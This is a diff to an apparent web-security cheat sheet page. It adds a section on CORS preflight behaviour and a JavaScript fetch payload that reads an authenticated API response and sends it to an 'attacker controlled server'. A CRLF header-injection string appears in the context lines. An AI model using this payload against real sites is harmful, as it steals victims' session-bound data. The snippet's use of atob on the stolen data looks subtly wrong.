@@ -278,6 +278,24 @@ home/000~ROOT~000 # https://github.com/stefanpejcic/wordpress-malware/blob/9b74d
 /%u000aSet-Cookie:crlf=injection
 </code></pre></div>
 <h2 id="cross-origin-resource-sharing-cors_1">Cross-Origin Resource Sharing (CORS)</h2>
+<p><code>GET</code>and  <code>HEAD</code> requests do not generally require a preflight <code>OPTION</code> request.</p>
+<ul>
+<li><code>POST</code> requests using non-standard content type such as <code>application/json</code> <strong>will</strong> generate a preflight request to the server. </li>
+<li>Instead, content types such as <code>application/x-www-form-urlencoded</code> or <code>multipart/form-data</code> <strong>will not</strong>.</li>
+</ul>
+<p>This is relevant since a server may accept arbitrary origins for <code>POST</code> requests <strong>but not</strong> for <code>OPTIONS</code> requests:</p>
+<ul>
+<li>If that's the case, only <code>POST</code> with standard content types can be exploited.</li>
+</ul>
+<p>Exploit CORS misconfiguration with <code>fetch</code> to exfiltrate data to an attacker controlled server:</p>
+<div class="highlight"><pre><span></span><code><span class="nx">fetch</span><span class="p">(</span><span class="s2">"http://concord:8001/api/service/console/whoami"</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">credentials</span><span class="o">:</span><span class="w"> </span><span class="s1">'include'</span>
+<span class="w">    </span><span class="p">})</span>
+<span class="w">    </span><span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="k">async</span><span class="w"> </span><span class="p">(</span><span class="nx">response</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="kd">let</span><span class="w"> </span><span class="nx">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">response</span><span class="p">.</span><span class="nx">text</span><span class="p">();</span>
+<span class="w">        </span><span class="nx">fetch</span><span class="p">(</span><span class="s2">"http://&lt;attacker controlled server&gt;/?data="</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">atob</span><span class="p">(</span><span class="nx">data</span><span class="p">))</span>
+<span class="w">    </span><span class="p">})</span>
+</code></pre></div>
 <p><code>Access-Control-Allow-Origin</code> (ACAO) is set to null for:</p>
 <ul>
 <li>Cross-origin redirects</li>
